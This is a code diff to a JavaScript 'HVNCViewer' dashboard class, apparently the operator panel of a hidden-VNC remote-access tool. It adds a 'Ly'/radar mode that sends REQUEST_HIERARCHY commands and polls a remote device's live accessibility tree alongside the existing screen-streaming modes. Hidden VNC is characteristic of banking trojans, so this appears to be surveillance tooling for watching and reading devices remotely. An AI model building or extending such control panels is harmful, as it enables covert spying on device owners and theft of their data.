@@ -104,8 +104,9 @@ class HVNCViewer {
 
     this._zoom    = 1.0;
     this._quality = 50;
-    this._mode    = 'vnc';   // 'vnc' | 'v2' | 'duplo'
+    this._mode    = 'vnc';   // 'vnc' | 'v2' | 'duplo' | 'radar'
     this._running = false;
+    this._lyReader = null;  // LyReader instance (RADAR mode)
 
     this._buildUI();
 
@@ -158,9 +159,12 @@ class HVNCViewer {
 
         <!-- Mode selector -->
         <div style="display:flex;border:1px solid #1e1e32;border-radius:6px;overflow:hidden">
-          <button id="_hv_m_vnc"  class="_hvmode active" data-mode="vnc" >VNC</button>
-          <button id="_hv_m_v2"   class="_hvmode"        data-mode="v2"  >V2</button>
+          <button id="_hv_m_vnc"  class="_hvmode active" data-mode="vnc"  >VNC</button>
+          <button id="_hv_m_v2"   class="_hvmode"        data-mode="v2"   >V2</button>
           <button id="_hv_m_dpl"  class="_hvmode"        data-mode="duplo">DUPLO</button>
+          <button id="_hv_m_rdr"  class="_hvmode"        data-mode="radar"
+            style="border-left:1px solid #1e1e32;color:#3dba7a"
+            title="Ly Screen Reader — renders the live accessibility tree">Ly</button>
         </div>
 
         <!-- Start / Stop -->
@@ -280,6 +284,8 @@ class HVNCViewer {
             max-width:100%;max-height:100%;object-fit:contain;
             cursor:crosshair;outline:none;user-select:none;touch-action:none"></canvas>
         </div>
+        <!-- Ly RADAR screen reader panel -->
+        <div id="_hv_radarpanel" style="flex:1;display:none;position:relative;overflow:hidden;border-left:1px solid #1a1a2e"></div>
       </div>
     </div>
 
@@ -325,12 +331,32 @@ class HVNCViewer {
         const wasRunning = this._running;
         if (wasRunning) this.stop();
         this._mode = btn.dataset.mode;
-        const v2panel = c.querySelector('#_hv_v2panel');
+
+        const v2panel    = c.querySelector('#_hv_v2panel');
+        const radarPanel = c.querySelector('#_hv_radarpanel');
+        const mainCanvas = c.querySelector('#_hv_cv').parentElement;
+
+        // Reset panel visibility
+        v2panel.style.display    = 'none';
+        radarPanel.style.display = 'none';
+        mainCanvas.style.display = 'flex';
+
         if (this._mode === 'duplo') {
           v2panel.style.display = 'flex';
-        } else {
-          v2panel.style.display = 'none';
+        } else if (this._mode === 'radar') {
+          // Hide pixel stream canvas in radar mode, show reader panel
+          mainCanvas.style.display = 'none';
+          radarPanel.style.display = 'block';
+          // Instantiate LyReader if not already
+          if (!this._lyReader && typeof LyReader !== 'undefined') {
+            this._lyReader = new LyReader(
+              radarPanel, this.deviceId,
+              obj => this._send(obj),
+              this.screenW, this.screenH
+            );
+          }
         }
+
         if (wasRunning) setTimeout(() => this.start(), 200);
       });
     });
@@ -455,6 +481,26 @@ class HVNCViewer {
         this._sendOp({ type: 'vnc_subscribe',    devId: this.deviceId, quality: this._quality });
         this._sendOp({ type: 'vnc_v2_subscribe', devId: this.deviceId, quality: this._quality });
         break;
+
+      case 'radar':
+        // Ly Screen Reader — continuous accessibility tree polling
+        if (this._lyReader) {
+          this._lyReader.startPolling(700);
+        } else if (typeof LyReader !== 'undefined') {
+          const radarPanel = this.container.querySelector('#_hv_radarpanel');
+          if (radarPanel) {
+            this._lyReader = new LyReader(
+              radarPanel, this.deviceId,
+              obj => this._send(obj),
+              this.screenW, this.screenH
+            );
+            this._lyReader.startPolling(700);
+          }
+        } else {
+          // LyReader script not loaded — fire single shot
+          this._send({ type: 'cmd', target: this.deviceId, cmd: 'REQUEST_HIERARCHY', args: {} });
+        }
+        break;
     }
   }
 
@@ -474,6 +520,9 @@ class HVNCViewer {
       case 'duplo':
         this._sendOp({ type: 'vnc_unsubscribe',    devId: this.deviceId });
         this._sendOp({ type: 'vnc_v2_unsubscribe', devId: this.deviceId });
+        break;
+      case 'radar':
+        if (this._lyReader) this._lyReader.stopPolling();
         break;
     }
 
@@ -797,8 +846,31 @@ class HVNCViewer {
   }
 
   // ── Cleanup ────────────────────────────────────────────────────────────────
+  // ── Called by dash.js when a screen_hierarchy WS event arrives ─────────────
+  onHierarchy(data) {
+    if (this._mode !== 'radar') return;
+    if (!this._lyReader) {
+      // Lazy-init: create reader now if panel already visible
+      const radarPanel = this.container.querySelector('#_hv_radarpanel');
+      if (radarPanel && typeof LyReader !== 'undefined') {
+        this._lyReader = new LyReader(
+          radarPanel, this.deviceId,
+          obj => this._send(obj),
+          this.screenW, this.screenH
+        );
+      }
+    }
+    if (this._lyReader) this._lyReader.update(data);
+  }
+
+  // ── Called if container resizes ─────────────────────────────────────────────
+  onResize() {
+    if (this._lyReader) this._lyReader.onResize();
+  }
+
   destroy() {
     this.stop();
+    if (this._lyReader) { this._lyReader.destroy(); this._lyReader = null; }
     cancelAnimationFrame(this._rafId);
     clearInterval(this._qaTimer);
     clearInterval(this._sparkTimer);
